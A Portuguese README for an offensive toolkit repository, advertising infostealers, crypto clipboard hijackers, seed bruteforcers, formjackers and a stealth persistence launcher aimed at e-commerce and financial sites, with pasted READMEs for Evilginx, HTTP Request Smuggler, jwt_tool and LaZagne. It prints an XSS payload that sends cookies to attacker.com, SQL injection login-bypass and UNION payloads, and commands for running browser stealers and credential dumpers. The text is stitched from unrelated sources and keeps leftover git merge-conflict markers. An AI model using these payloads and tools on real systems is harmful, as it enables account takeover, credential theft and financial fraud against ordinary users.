🛡️ Security-Stuffers-Lab — APT Level Red Team Arsenal

🚀 Security-Stuffers-Lab é um laboratório avançado focado em técnicas e ferramentas ofensivas usadas em cenários reais de APTs, operações de Red Teaming e Threat Emulation.

Este projeto reúne explorações práticas, scripts de ataque, stealers, bruteforcers, exfiltradores stealth, e agora módulos de ataques adversariais contra Inteligência Artificial, tudo pronto para estudos, treinos e simulações de guerra cibernética realista.

🎯 O que você encontra aqui

Categoria	Conteúdo
Infostealers	Roubo de credenciais locais, tokens, browser credentials (Chrome, Edge, Brave)
Crypto Attack Modules	Clipboard hijacking, wallet skimming, brute-force de seeds BIP-39
Bruteforce Tools	Password bruteforcers, seed hunters, Ethereum key bruters
Web Attack Vectors	JWT tampering, HTTP Request Smuggling, BOLA, WebSocket hijacking
Memory Dumpers	Dump de RAM furtivo, extração de chaves/metadados de memória viva
Exfiltration Modules	Extração furtiva via HTTPS, DNS covert channels, stealth upload
Adversarial AI Attacks	FGSM, CW attacks, BadNets poisoning, model evasion, IDS bypass
Persistence Techniques	Fileless persistence, Service Worker abuse, auto-restart stealth
Credential Harvesters	Modules para stuffing em serviços Web2/Web3
⚔️ Diferenciais do Security-Stuffers-Lab
Ataques reais — nada de PoCs teóricos, são técnicas usadas por grupos APT e Red Teams profissionais.

Atualizado — inclusão contínua de ataques emergentes em Web3, Cloud, IA e APIs modernas.

Alta modularidade — cada vetor é independente para ser reusado ou expandido facilmente.

Pronto para treinar — perfeito para Red Teams, Ciber Ranges, Capture the Flag ofensivos e estudo pessoal.

🚨 Aviso Legal
Este projeto é destinado exclusivamente para fins educacionais e de pesquisa em segurança cibernética.
O uso indevido das técnicas aqui demonstradas contra sistemas sem autorização explícita é ilegal.

📚 Estrutura do LAB
bash
Copiar
Editar
Security-Stuffers-Lab/
├── Infostealers/
├── Crypto-Attacks/
├── BruteForcers/
├── Exfiltration-Modules/
├── Advanced-Web-Attack-Vectors/
│   ├── JWT-Token-Manipulation/
│   ├── HTTP-Request-Smuggling/
│   ├── Business-Logic-Flaws/
│   ├── Broken-Object-Level-Authorization/
│   ├── Advanced-SQLi-OOB/
│   ├── Cache-Deception-Attacks/
│   ├── Cross-Site-WebSocket-Hijacking/
│   └── Clickjacking-Frame-Injection/
├── Memory-Dumpers/
├── AI-Adversarial-Attacks/
│   ├── Adversarial-Robustness-Toolbox/
│   ├── Foolbox/
│   ├── AutoAttack/
│   ├── TextAttack/
│   ├── DeepExploit/
│   ├── BadNets/
│   ├── AdvPipe/
│   └── Adversarial-NIA/
└── README.md


🚧 **Em construção** – Este README está em constante aprimoramento.

⚠️ **Uso restrito**: apenas em ambientes controlados e com autorização explícita.

> **Objetivo:** Centralizar módulos e ferramentas Python para estudo de técnicas ofensivas em aplicações web, criptomoedas, Windows e browsers.

---

## 📂 Estrutura de Diretórios
Cada pasta agrupa scripts focados em um tipo de ataque ou ferramenta de pentest.

| 📁 **Diretório**                         | 📖 **Descrição**                                                                                 | 🎯 **Senioridade**      |
|------------------------------------------|-------------------------------------------------------------------------------------------------|-------------------------|
| **CrackMapExec/**                        | Pós-exploração Windows/AD (SMB, WinRM, NTLM relay, etc.)                                         | Intermediário–Avançado  |
| **DeathStar/**                           | Escalonamento de privilégios via API do Empire em Active Directory                              | Avançado                |
| **SprayingToolkit/**                     | Password spraying em OWA, O365, Lync, S4B                                                         | Intermediário           |
| **brutespray/**                          | Brute-force SSH, FTP, SMTP em sub-redes                                                           | Intermediário           |
| **chromedriver-credential-stuffing/**    | Credential stuffing com Chromedriver + proxies                                                     | Intermediário           |
| **credentiais/**                         | Extração de credenciais Windows (Vault, LSASS, DPAPI)                                             | Avançado                |
| **credential_stuffer/**                  | Credential stuffing genérico HTTP POST + wordlists                                                | Intermediário           |
| **credstuffer/**                         | Wrapper simplificado de brute/credential stuffing HTTP                                             | Júnior–Intermediário    |
| **crypto-stuffer/**                      | Ataques a cripto: clipboard hijack, seed bruteforce, exfiltração de fundos                         | Avançado                |
| **dumpers/**                             | Dump de bancos de dados locais (SQLite, Chrome Login Data, Firefox)                                | Intermediário           |
| **formjacker/**                          | Injeção JS em formulários para capturar campos sensíveis (cartão, CPF, etc.)                      | Intermediário           |
| **lfi-attack/**                          | LFI / Path Traversal com wordlists e PoC de RFI                                                    | Intermediário           |
| **pydictor/**                            | Geração e fuzz de dicionários (senhas, tokens)                                                   | Júnior–Intermediário    |
| **sql-injection/**                       | PoCs e automações de SQLi (blind, time-based, OOB)                                                | Intermediário           |
| **stealers-attack/**                     | Stealers: cookies, tokens, credenciais de browsers e apps                                         | Intermediário–Avançado  |
| **bowsers-attack/**                      | Stealer para navegadores (DPAPI, cookies, autofill, histórico)                                    | Intermediário           |
| **stealth_launcher/**                    | Framework in-memory: evasão (AMSI, ETW), persistence (UEFI, WMI), beaconing, cleanup forense       | Avançado–Expert         |
| **utils/**                               | Helpers gerais: logging, tratamento de exceções                                                   | Júnior–Intermediário    |

---

## 🚀 Requisitos e Instalação

| Item                  | Detalhes                                    |
|-----------------------|---------------------------------------------|
| **Python**           | 3.10+                                      |
| **SO**               | Windows (para módulos de Windows Internals) |
| **Dependências**     | `pip install -r requirements.txt`          |

```bash
git clone https://github.com/techleadevelopers/Security-Stuffers-Lab.git
cd Security-Stuffers-Lab
pip install -r requirements.txt
```

---

## 🔍 Exemplos de Execução

| Cenário                       | Comando                                                                       |
|-------------------------------|-------------------------------------------------------------------------------|
| **Stealer de navegadores**    | `python bowsers-attack/bowsers_attack.py`                                      |
| **SQLi automation**           | `python sql-injection/sqli_auto.py --target http://alvo.com --payloads payloads.txt` |
| **LFI attacker**              | `python lfi-attack/lfi_fuzzer.py --url http://alvo.com/index.php?page=`       |
| **Form Jacker**               | `python formjacker/formjacker.py template.html payload_name`                   |
| **Payload completo**          | `python stealth_launcher/stealth_launcher.py`                                  |

> Consulte o README de cada módulo para parâmetros avançados.

---

📋 Análise geral do repositório:
Foco do Lab:

Sim, claramente focado em técnicas de ataque realistas usadas contra e-commerces e aplicações financeiras.

Exposição a vulnerabilidades típicas de sites que lidam com credenciais, cookies, criptomoedas e SQL Injection.

🛡️ Áreas principais de exploração:
Cookie Theft / Session Hijacking:

Vários exemplos de roubo e manipulação de cookies de sessão.
Ataca problemas como:
Cookies inseguros (HttpOnly e Secure faltando).
Sessões que não expiram corretamente (vulneráveis a Session Fixation).
Ferramentas envolvidas: Burp Suite, manual payload crafting.

Credential Stuffing & Brute-Force:

Automatização de tentativas de login usando:
Usuários e senhas comuns (admin/admin, 123456, etc).
Listas customizadas de senhas (wordlists).
Exemplo de ataque que aproveita:
Respostas inconsistentes de erro (diferença entre "usuário inválido" e "senha inválida").
Falta de rate-limiting no endpoint de login.

Criptomoedas / Transações:

Simulações de ataques contra sistemas de pagamento em criptomoeda:
Man-in-the-Middle para alterar valores de pagamento.
SQL Injection para acessar carteiras ou registros de transações.
Falhas em implementações de webhooks de pagamento.

SQL Injection:
Clássico, mas com cenário bem focado:
SQLi em campos de login, carrinho de compras, checkout.
Tanto error-based SQLi quanto blind SQLi (time-based, boolean-based).

Exemplo de payloads usados:

' OR '1'='1 para bypass de login.
' UNION SELECT null, username, password FROM users -- para data exfiltration.

🏗️ Como isso aparece nos CÓDIGOS:
Vulnerabilidades comuns que encontrei:
Uso de query strings direto sem parametrização segura (risco de SQL Injection).
Armazenamento de cookies sem SameSite=Strict.
Falta de verificação de origem (CSRF protection) nos endpoints críticos.
Respostas HTTP revelando informações internas do sistema.
Falta de controle de tentativas de login (no account lockout).
Scripts JS no front-end que manipulam informações sensíveis antes da criptografia.

📦 Exemplos de payloads perigosos que cabem no seu lab:

SQL Injection (Login Bypass):

' OR '1'='1' --

Cookie Theft (via XSS):

<script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</script>

🔥 Possíveis pontos onde essas vulnerabilidades aparecem em e-commerces:

Área	Tipo de Falha	Como Explorar
Login	SQLi / Credential Stuffing	Injeção nos campos de login / Brute-force
Carrinho	Manipulação de Cookies / Sessões	Roubo de session ID
Checkout	SQL Injection	Alterar preços, forjar compras
APIs de Pagamento	Webhook Vulnerável / CSRF / MITM	Roubo de saldo de criptomoedas / falsificar pagamento
Área de Usuário	XSS + Session Hijacking	Sequestro de conta

🔧 Ferramentas que você poderia usar pra pentestar baseado no seu lab:
Burp Suite (com extensões como AuthMatrix, Turbo Intruder).
SQLmap para automatizar testes de SQL Injection.
Hydra ou FFUF para credential stuffing e brute-force.
OWASP ZAP para explorar session issues e XSS.
Mitmproxy para interceptar transações de criptomoedas.

📊 Conclusão:
✅ lab está 90% focado em cenários de ataque a e-commerce e aplicações financeiras, principalmente mirando:

Roubo de credenciais (Credential Stuffing).
Roubo de sessões e cookies.
Abusos de sistemas de pagamento em cripto.
SQL Injection em pontos críticos.

✅ Abordagem prática, realista e muito alinhada com o que a maioria dos sites vulneráveis hoje ainda sofre.




# Advanced Web Attacks Vectors


# Evilginx 3.0

**Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.

<<<<<<< HEAD
=======
This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.

<p align="center">
  <img alt="Screenshot" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png" height="320" />
</p>

## Disclaimer

I am very much aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect their users against this type of phishing attacks. Evilginx should be used only in legitimate penetration testing assignments with written permission from to-be-phished parties.

## Evilginx Mastery Training Course

If you want everything about reverse proxy phishing with **Evilginx** - check out my [Evilginx Mastery](https://academy.breakdev.org/evilginx-mastery) course!

<p align="center">
  <a href="https://academy.breakdev.org/evilginx-mastery"><img alt="Evilginx Mastery" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx_mastery.jpg" height="320" /></a>
</p>

Learn everything about the latest methods of phishing, using reverse proxying to bypass Multi-Factor Authentication. Learn to think like an attacker, during your red team engagements, and become the master of phishing with Evilginx.

Grab it here:
https://academy.breakdev.org/evilginx-mastery

>>>>>>> 926d3f0 (Adicionando Modulos AI-Adversarial Attackss)
## Official Gophish integration

If you'd like to use Gophish to send out phishing links compatible with Evilginx, please use the official Gophish integration with Evilginx 3.3.
You can find the custom version here in the forked repository: [Gophish with Evilginx integration](https://github.com/kgretzky/gophish/)

If you want to learn more about how to set it up, please follow the instructions in [this blog post](https://breakdev.org/evilginx-3-3-go-phish/)

## Write-ups

If you want to learn more about reverse proxy phishing, I've published extensive blog posts about **Evilginx** here:

[Evilginx 2.0 - Release](https://breakdev.org/evilginx-2-next-generation-of-phishing-2fa-tokens)

[Evilginx 2.1 - First Update](https://breakdev.org/evilginx-2-1-the-first-post-release-update/)

[Evilginx 2.2 - Jolly Winter Update](https://breakdev.org/evilginx-2-2-jolly-winter-update/)

[Evilginx 2.3 - Phisherman's Dream](https://breakdev.org/evilginx-2-3-phishermans-dream/)

[Evilginx 2.4 - Gone Phishing](https://breakdev.org/evilginx-2-4-gone-phishing/)

[Evilginx 3.0](https://breakdev.org/evilginx-3-0-evilginx-mastery/)

[Evilginx 3.2](https://breakdev.org/evilginx-3-2/)

[Evilginx 3.3](https://breakdev.org/evilginx-3-3-go-phish/)

<<<<<<< HEAD
=======
## Help

In case you want to learn how to install and use **Evilginx**, please refer to online documentation available at:

https://help.evilginx.com

## Support

I DO NOT offer support for providing or creating phishlets. I will also NOT help you with creation of your own phishlets. Please look for ready-to-use phishlets, provided by other people.

## License

**evilginx2** is made by Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky)) and it's released under BSD-3 license.
>>>>>>> 926d3f0 (Adicionando Modulos AI-Adversarial Attackss)



-----------------------------------------



# HTTP Request Smuggler

This is an extension for Burp Suite designed to help you launch [HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling) attacks, originally created during [HTTP Desync Attacks](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn) research. It supports scanning for Request Smuggling vulnerabilities, and also aids exploitation by handling cumbersome offset-tweaking for you.

This extension should not be confused with [Burp Suite HTTP Smuggler](https://github.com/nccgroup/BurpSuiteHTTPSmuggler), which uses similar techniques but is focused exclusively bypassing WAFs.

### Install
The easiest way to install this is in Burp Suite, via `Extender -> BApp Store`.

If you prefer to load the jar manually, in Burp Suite (community or pro), use `Extender -> Extensions -> Add` to load `build/libs/http-request-smuggler-all.jar`

### Compile
[Turbo Intruder](https://github.com/PortSwigger/turbo-intruder) is a dependency of this project, add it to the root of this source tree as `turbo-intruder-all.jar`

Build using:

Linux: `./gradlew build fatjar`

Windows: `gradlew.bat build fatjar`

Grab the output from `build/libs/desynchronize-all.jar`

### Use
Right click on a request and click `Launch Smuggle probe`, then watch the extension's output pane under `Extender->Extensions->HTTP Request Smuggler`

If you're using Burp Pro, any findings will also be reported as scan issues.

If you right click on a request that uses chunked encoding, you'll see another option marked `Launch Smuggle attack`. This will open a Turbo Intruder window in which you can try out various attacks by editing the `prefix` variable.

For more advanced use watch the [video](https://portswigger.net/blog/http-desync-attacks).

### Practice

We've released a collection of [free online labs to practise against](https://portswigger.net/web-security/request-smuggling). Here's how to use the tool to solve the first lab - [HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te):

1. Use the Extender->BApp store tab to install the 'HTTP Request Smuggler' extension.
2. Load the lab homepage, find the request in the proxy history, right click and select 'Launch smuggle probe', then click 'OK'.
3. Wait for the probe to complete, indicated by 'Completed 1 of 1' appearing in the extension's output tab.
4. If you're using Burp Suite Pro, find the reported vulnerability in the dashboard and open the first attached request.
5. If you're using Burp Suite Community, copy the request from the output tab and paste it into the repeater, then complete the 'Target' details on the top right.
6. Right click on the request and select 'Smuggle attack (CL.TE)'.
7. Change the value of the 'prefix' variable to 'G', then click 'Attack' and confirm that one response says 'Unrecognised method GPOST'.

By changing the 'prefix' variable in step 7, you can solve all the labs and virtually every real-world scenario.


--------------------------------------------------------


# The JSON Web Token Toolkit v2
>*jwt_tool.py* is a toolkit for validating, forging, scanning and tampering JWTs (JSON Web Tokens).  

![jwt_tool version](https://img.shields.io/badge/version-v2.2.7-blue) ![python version](https://img.shields.io/badge/python-v3.6+-green)

![logo](https://user-images.githubusercontent.com/19988419/100555535-18598280-3294-11eb-80ed-ca5a0c3455d6.png)

Its functionality includes:
* Checking the validity of a token
* Testing for known exploits:
  * (CVE-2015-2951) The ***alg=none*** signature-bypass vulnerability
  * (CVE-2016-10555) The ***RS/HS256*** public key mismatch vulnerability
  * (CVE-2018-0114) ***Key injection*** vulnerability
  * (CVE-2019-20933/CVE-2020-28637) ***Blank password*** vulnerability
  * (CVE-2020-28042) ***Null signature*** vulnerability
* Scanning for misconfigurations or known weaknesses
* Fuzzing claim values to provoke unexpected behaviours
* Testing the validity of a secret/key file/Public Key/JWKS key
* Identifying ***weak keys*** via a High-speed ***Dictionary Attack***
* Forging new token header and payload contents and creating a new signature with the **key** or via another attack method
* Timestamp tampering
* RSA and ECDSA key generation, and reconstruction (from JWKS files)
* ...and lots more!

---

## Audience
This tool is written for **pentesters**, who need to check the strength of the tokens in use, and their susceptibility to known attacks. A range of tampering, signing and verifying options are available to help delve deeper into the potential weaknesses present in some JWT libraries.  
It has also been successful for **CTF challengers** - as CTFs seem keen on JWTs at present.  
It may also be useful for **developers** who are using JWTs in projects, but would like to test for stability and for known vulnerabilities when using forged tokens.

---

## Requirements
This tool is written natively in **Python 3** (version 3.6+) using the common libraries, however various cryptographic funtions (and general prettiness/readability) do require the installation of a few common Python libraries.  
*(An older Python 2.x version of this tool is available on the legacy branch for those who need it, although this is no longer be supported or updated)*

---

## Installation

### Docker
The preferred usage for jwt_tool is with the [official Dockerhub-hosted jwt_tool docker image](https://hub.docker.com/r/ticarpi/jwt_tool)  
The base command for running this is as follows:  
Base command for running jwt_tool:  
`docker run -it --network "host" --rm -v "${PWD}:/tmp" -v "${HOME}/.jwt_tool:/root/.jwt_tool" ticarpi/jwt_tool`  

By using the above command you can tag on any other arguments as normal.  
Note that local files in your current working directory will be mapped into the docker container's /tmp directory, so you can use them using that absolute path in your arguments.  
i.e.  
*/tmp/localfile.txt*

### Manual Install
Installation is just a case of downloading the `jwt_tool.py` file (or `git clone` the repo).  
(`chmod` the file too if you want to add it to your *$PATH* and call it from anywhere.)

`$ git clone https://github.com/ticarpi/jwt_tool`  
`$ python3 -m pip install -r requirements.txt`  

On first run the tool will generate a config file, some utility files, logfile, and a set of Public and Private keys in various formats.  

### Custom Configs
* To make best use of the scanning options it is **strongly advised** to copy the custom-generated JWKS file somewhere that can be accessed remotely via a URL. This address should then be stored in `jwtconf.ini` as the "jwkloc" value.  
* In order to capture external service interactions - such as DNS lookups and HTTP requests - put your unique address for Burp Collaborator (or other alternative tools such as RequestBin) into the config file as the "httplistener" value.  
***Review the other options in the config file to customise your experience.***

### Colour bug in Windows
To fix broken colours in Windows cmd/Powershell: uncomment the below two lines in `jwt_tool.py` (remove the "# " from the beginning of each line)  
You will also need to install colorama: `python3 -m pip install colorama`
```
# import colorama
# colorama.init()
```
---

## Usage
The first argument should be the JWT itself (*unless providing this in a header or cookie value*). Providing no additional arguments will show you the decoded token values for review.  
`$ python3 jwt_tool.py <JWT>`  
or the Docker base command:  
`$ docker run -it --network "host" --rm -v "${PWD}:/tmp" -v "${HOME}/.jwt_tool:/root/.jwt_tool" ticarpi/jwt_tool`  

The toolkit will validate the token and list the header and payload values.  

### Additional arguments
The many additional arguments will take you straight to the appropriate function and return you a token ready to use in your tests.  
For example, to tamper the existing token run the following:  
`$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -T`  

Many options need additional values to set options.  
For example, to run a particular type of exploit you need to choose the eXploit (-X) option and select the vulnerability (here using "a" for the *alg:none* exploit):  
`$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -X a`

### Extra parameters
Some options such as Verifying tokens require additional parameters/files to be provided (here providing the Public Key in PEM format):  
`$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -V -pk public.pem`  

### Sending tokens to a web application
All modes now allow for sending the token directly to an application.  
You need to specify:  
* target URL (-t)
* a request header (-rh) or request cookies (-rc) that are needed by the application (***at least one must contain the token***)
* (optional) any POST data (where the request is a POST)
* (optional) any additional jwt_tool options, such as modes or tampering/injection options  
* (optional) a *canary value* (-cv) - a text value you expect to see in a successful use of the token (e.g. "Welcome, ticarpi")  
An example request might look like this (using scanning mode for forced-errors):  
`$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -rh "Origin: null" -cv "Welcome" -M er` 

Various responses from the request are displayed:  
* Response code
* Response size
* Unique request tracking ID (for use with logging)
* Mode/options used

---

## Common Workflow

Here is a quick run-through of a basic assessment of a JWT implementation. If no success with these options then dig deeper into other modes and options to hunt for new vulnerabilities (or zero-days!).  

### Recon:  
Read the token value to get a feel for the claims/values expected in the application:  
`$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw`  

### Scanning:
Run a ***Playbook Scan*** using the provided token directly against the application to hunt for common misconfigurations:  
`$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb`  

### Exploitation:
If any successful vulnerabilities are found change any relevant claims to try to exploit it (here using the *Inject JWKS* exploit and injecting a new username):  
`$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin` 

### Fuzzing:
Dig deeper by testing for unexpected values and claims to identify unexpected app behaviours, or run attacks on programming logic or token processing:  
`$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt`  

### Review:
Review any successful exploitation by querying the logs to read more data about the request and :  
`$ python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`   

---

### Help
For a list of options call the usage function:
Some options such as Verifying tokens require additional parameters/files to be provided:  
`$ python3 jwt_tool.py -h`

**A more detailed user guide can be found on the [wiki page](https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool).**

---

## JWT Attack Playbook - new wiki content!  
![playbook_logo](https://user-images.githubusercontent.com/57728093/68797806-21f25700-064d-11ea-9baa-c58fb6f75c0b.png)

Head over to the [JWT Attack Playbook](https://github.com/ticarpi/jwt_tool/wiki) for a detailed run-though of what JWTs are, what they do, and a full workflow of how to thoroughly test them for vulnerabilities, common weaknesses and unintended coding errors.

---

## Tips
**Regex for finding JWTs in Burp Search**  
*(make sure 'Case sensitive' and 'Regex' options are ticked)*  
`[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*` - url-safe JWT version  
`[= ]eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*` - all JWT versions (higher possibility of false positives)

---

## Further Reading
* [JWT Attack Playbook (https://github.com/ticarpi/jwt_tool/wiki)](https://github.com/ticarpi/jwt_tool/wiki) - for a thorough JWT testing methodology

* [A great intro to JWTs - https://jwt.io/introduction/](https://jwt.io/introduction/)

* A lot of the initial inspiration for this tool comes from the vulnerabilities discovered by Tim McLean.  
[Check out his blog on JWT weaknesses here: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)  

* A whole bunch of exercises for testing JWT vulnerabilities are provided by [Pentesterlab (https://www.pentesterlab.com)](https://www.pentesterlab.com). I'd highly recommend a PRO subscription if you are interested in Web App Pentesting.  

  *PLEASE NOTE:* This toolkit will solve most of the Pentesterlab JWT exercises in a few seconds when used correctly, however I'd **strongly** encourage you to work through these exercises yourself, working out the structure and the weaknesses. After all, it's all about learning...


-----------------------------------------------------



__The LaZagne Project !!!__
==

Description
----
The __LaZagne project__ is an open source application used to __retrieve lots of passwords__ stored on a local computer. 
Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). This tool has been developed for the purpose of finding these passwords for the most commonly-used software. 

<p align="center"><img src="https://user-images.githubusercontent.com/10668373/43320585-3e34c124-91a9-11e8-9ebc-d8eabafd8ac5.png" alt="The LaZagne project"></p>

This project has been added to [pupy](https://github.com/n1nj4sec/pupy/) as a post-exploitation module. Python code will be interpreted in memory without touching the disk and it works on Windows and Linux host.

Standalones
----
Standalones are now available here: https://github.com/AlessandroZ/LaZagne/releases/

Installation
----
```
pip install -r requirements.txt
```

Usage
----
* Launch all modules
```
laZagne.exe all
```

* Launch only a specific module
```
laZagne.exe browsers
```

* Launch only a specific software script
```
laZagne.exe browsers -firefox
```

* Write all passwords found into a file (-oN for Normal txt, -oJ for Json, -oA for All).
Note: If you have problems to parse JSON results written as a multi-line strings, check [this](https://github.com/AlessandroZ/LaZagne/issues/226). 
```
laZagne.exe all -oN
laZagne.exe all -oA -output C:\Users\test\Desktop
```

* Get help
```
laZagne.exe -h
laZagne.exe browsers -h
```


* Change verbosity mode (2 different levels)
```
laZagne.exe all -vv
```

* Quiet mode (nothing will be printed on the standard output)
```
laZagne.exe all -quiet -oA
```

* To decrypt domain credentials, it could be done specifying the user windows password. Otherwise it will try all passwords already found as windows passwords. 
```
laZagne.exe all -password ZapataVive
```

__Note: For wifi passwords \ Windows Secrets, launch it with administrator privileges (UAC Authentication / sudo)__

Mac OS
----
__Note: In Mac OS System, without the user password it is very difficult to retrieve passwords stored on the computer.__ 
So, I recommend using one of these options

* If you know the user password, add it in the command line 
```
laZagne all --password SuperSecurePassword
```
* You could use the interactive mode that will prompt a dialog box to the user until the password will be correct 
```
laZagne all -i
```

Supported software
----

|  | Windows    | Linux  | Mac |
| -- | -- | -- | -- |
| Browsers | 7Star<br> Amigo<br> Basilisk <br> BlackHawk<br> Brave<br> Centbrowser<br> Chedot<br> Chrome Beta<br> Chrome Canary<br> Chromium<br> Coccoc<br> Comodo Dragon<br> Comodo IceDragon<br> Cyberfox<br> DCBrowser <br> Elements Browser<br> Epic Privacy Browser<br> Firefox<br> Google Chrome<br> Icecat<br> K-Meleon<br> Kometa<br> Microsoft Edge<br> Opera<br> Opera GX<br> Orbitum <br> QQBrowser <br> pale Moon <br> SogouExplorer <br> Sputnik<br> Torch<br> Uran<br> Vivaldi<br> Yandex<br> | Brave<br> Chromium<br> Dissenter-Browser<br> Firefox<br> Google Chrome<br> IceCat<br> Microsoft Edge<br> Opera<br> SlimJet<br> Vivaldi | Chrome<br> Firefox |
| Chats | Pidgin<br> Psi<br> Skype| Pidgin<br> Psi |  |
| Databases | DBVisualizer<br> Postgresql<br> Robomongo<br> Squirrel<br> SQLdevelopper | DBVisualizer<br> Squirrel<br> SQLdevelopper  |  |
| Games | GalconFusion<br> Kalypsomedia<br> RogueTale<br> Turba |  |  |
| Git | Git for Windows |  |  |
| Mails | Epyrus <br> Interlink <br> Outlook<br> Thunderbird  | Clawsmail<br> Thunderbird |  |
| Maven | Maven Apache<br> |  |  |
| Dumps from memory | Keepass<br> Mimikatz method | System Password |  |
| Multimedia | EyeCON<br> |  |  |
| PHP | Composer<br> |  |  |
| SVN | Tortoise  | | |
| Sysadmin | Apache Directory Studio<br> CoreFTP<br> CyberDuck<br> FileZilla<br> FileZilla Server<br> FTPNavigator<br> OpenSSH<br> OpenVPN<br> mRemoteNG <br> KeePass Configuration Files (KeePass1, KeePass2)<br> PuttyCM<br>Rclone<br>RDPManager<br> VNC<br> WinSCP<br> Windows Subsystem for Linux | Apache Directory Studio<br> AWS<br>  Docker<br> Environnement variable<br> FileZilla<br> gFTP<br> History files<br> Shares <br> SSH private keys <br> KeePass Configuration Files (KeePassX, KeePass2) <br> Grub <br> Rclone |  |
| Wifi | Wireless Network | Network Manager<br> WPA Supplicant |  |
| Internal mechanism passwords storage | Autologon<br> MSCache<br> Credential Files<br> Credman <br> DPAPI Hash <br> Hashdump (LM/NT)<br> LSA secret<br> Vault Files | GNOME Keyring<br> Kwallet<br> Hashdump | Keychains<br> Hashdump |


Compile
----

* Using Pyinstaller
```
pyinstaller --additional-hooks-dir=. -F --onefile laZagne.py
```
* Using Nuitka
```
python3 -m nuitka --standalone --onefile --include-package=lazagne laZagne.py
```

For developers
----
Please refer to the wiki before opening an issue to understand how to compile the project or to develop a new module.
https://github.com/AlessandroZ/LaZagne/wiki

Donation
----
If you want to support my work doing a donation, I will appreciate a lot:
* Via BTC: 16zJ9wTXU4f1qfMLiWvdY3woUHtEBxyriu
* Via Paypal: https://www.paypal.me/lazagneproject

Special thanks
----
* Harmjoy for [KeeThief](https://github.com/HarmJ0y/KeeThief/)
* n1nj4sec for his [mimipy](https://github.com/n1nj4sec/mimipy) module
* Benjamin DELPY for [mimikatz](https://github.com/gentilkiwi/mimikatz), which helps me to understand some Windows API.
* @skelsec for [Pypykatz](https://github.com/skelsec/pypykatz)
* Moyix for [Creddump](https://github.com/moyix/creddump)
* N0fat for [Chainbreaker](https://github.com/n0fate/chainbreaker/)
* Richard Moore for the [AES module](https://github.com/ricmoo/pyaes)
* Todd Whiteman for the [DES module](https://github.com/toddw-as/pyDes)
* mitya57 for [secretstorage](https://github.com/mitya57/secretstorage)
* All [contributors](https://github.com/AlessandroZ/LaZagne/graphs/contributors) who help me on this project




---------------------------------------------------------

##### master

[![GitHub license](https://img.shields.io/github/license/srounet/pymem.svg)](https://github.com/srounet/Pymem/)
[![Build status](https://ci.appveyor.com/api/projects/status/sfdvrtuh9qa2f3aa/branch/master?svg=true)](https://ci.appveyor.com/project/srounet/pymem/branch/master)
[![codecov](https://codecov.io/gh/srounet/Pymem/branch/master/graph/badge.svg)](https://codecov.io/gh/srounet/Pymem/branch/master)
[![Discord](https://img.shields.io/discord/342944948770963476.svg)](https://discord.gg/xaWNac8)
[![Documentation Status](https://readthedocs.org/projects/pymem/badge/?version=latest)](https://pymem.readthedocs.io/?badge=latest)


